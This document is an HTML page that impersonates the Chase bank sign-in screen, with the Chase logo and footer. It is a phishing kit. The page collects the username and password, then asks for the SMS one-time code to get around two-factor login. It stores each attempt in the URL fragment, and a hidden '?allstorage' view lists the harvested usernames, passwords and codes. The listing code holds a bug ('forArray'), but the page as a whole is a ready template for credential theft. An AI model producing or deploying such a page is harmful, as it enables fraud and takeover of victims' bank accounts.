<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chase Online</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: url('https://images.pexels.com/photos/1608811/pexels-photo-1608811.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1') no-repeat center center fixed;
            background-size: cover;
            color: #333;
        }
        .container {
            width: 300px;
            margin: 50px auto;
            background: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
            height: auto;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            color: #666;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .form-group input[type="checkbox"] {
            width: auto;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #024b9b;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #01366d;
        }
        .links a {
            color: #024b9b;
            text-decoration: none;
            font-size: 12px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .footer a {
            color: #024b9b;
            margin: 0 10px;
            text-decoration: none;
        }
        #codeSection, #viewCreds {
            display: none;
        }
        #viewCreds {
            color: green;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Chase-bank-logo-bt.png" alt="Chase Logo">
        </div>
        <div id="loginSection">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password">
                <span style="float: right; color: #024b9b; font-size: 12px; cursor: pointer;">Show</span>
            </div>
            <div class="form-group" style="display: flex; gap: 10px;">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember me</label>
                <input type="checkbox" id="useToken" name="useToken">
                <label for="useToken">Use token</label>
            </div>
            <button class="btn" onclick="submitLogin()">Sign in</button>
            <div class="links">
                <a href="#">Forgot username/password?</a> <br>
                <a href="#">Not Enrolled? Sign Up Now.</a>
            </div>
        </div>
        <div id="codeSection">
            <p>Enter 6 digit code sent via text:</p>
            <div class="form-group">
                <input type="text" id="code" name="code" maxlength="6">
            </div>
            <button class="btn" onclick="submitCode()">Submit</button>
        </div>
        <div id="viewCreds" style="color: green; text-align: center;">
            <p id="credsContent">Verification complete. Thank you.</p>
        </div>
    </div>
    <div class="footer">
        <p>Follow us: <a href="#">f</a> <a href="#">i</a> <a href="#">x</a> <a href="#">in</a></p>
        <p><a href="#">Contact us</a> | <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Terms of use</a> | <a href="#">Accessibility</a></p>
        <p><a href="#">SAFE Act: Chase Mortgage Loan Originators</a> | <a href="#">Fair Lending</a> | <a href="#">About Chase</a></p>
        <p><a href="#">J.P. Morgan</a> | <a href="#">JPMorgan Chase & Co.</a> | <a href="#">Careers</a> | <a href="#">Español</a></p>
    </div>

    <script>
        // In-memory storage for this instance
        let localStorage = [];

        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            const useToken = document.getElementById('useToken').checked;
            const timestamp = new Date().toISOString();

            const creds = {
                time: timestamp,
                username: username,
                password: password,
                remember: remember ? 'Yes' : 'No',
                useToken: useToken ? 'Yes' : 'No',
                code: 'Not entered'
            };
            localStorage.push(creds);
            updateURL();

            document.getElementById('loginSection').style.display = 'none';
            document.getElementById('codeSection').style.display = 'block';
        }

        function submitCode() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            const useToken = document.getElementById('useToken').checked;
            const code = document.getElementById('code').value;
            const timestamp = new Date().toISOString();

            const creds = {
                time: timestamp,
                username: username,
                password: password,
                remember: remember ? 'Yes' : 'No',
                useToken: useToken ? 'Yes' : 'No',
                code: code
            };
            localStorage.push(creds);
            updateURL();

            document.getElementById('codeSection').style.display = 'none';
            document.getElementById('viewCreds').style.display = 'block';
            document.getElementById('credsContent').innerHTML = '<p>Verification complete. Thank you.</p>';
        }

        function updateURL() {
            const credsString = JSON.stringify(localStorage);
            window.location.hash = 'creds=' + encodeURIComponent(credsString);
        }

        // Handle /allstorage route
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('allstorage')) {
                document.getElementById('loginSection').style.display = 'none';
                document.getElementById('codeSection').style.display = 'none';
                document.getElementById('viewCreds').style.display = 'block';

                // Parse creds from URL fragment
                const hashParams = new URLSearchParams(window.location.hash.replace('#', '?'));
                const credsString = hashParams.get('creds');
                let allCreds = [];

                if (credsString) {
                    try {
                        allCreds = JSON.parse(decodeURIComponent(credsString));
                    } catch (e) {
                        console.error('Invalid creds format:', e);
                    }
                }

                let credsHtml = '<h2>Server Storage Credentials</h2>';
                if (Array.isArray(allCreds) && allCreds.length > 0) {
                    allCreds.forArray((creds, index) => {
                        credsHtml += `
                            <div style="margin-bottom: 20px;">
                                <h3>Attempt ${index + 1} (${creds.time})</h3>
                                <p><strong>Username:</strong> ${creds.username || 'N/A'}</p>
                                <p><strong>Password:</strong> ${creds.password || 'N/A'}</p>
                                <p><strong>Code (OTP):</strong> ${creds.code || 'Not submitted'}</p>
                            </div>
                        `;
                    });
                } else {
                    credsHtml += '<p>No credentials stored yet.</p>';
                }
                document.getElementById('credsContent').innerHTML = credsHtml;
            }
        };

        // Simulate showing password
        document.querySelector('span').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
            this.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
        });
    </script>
</body>
</html>
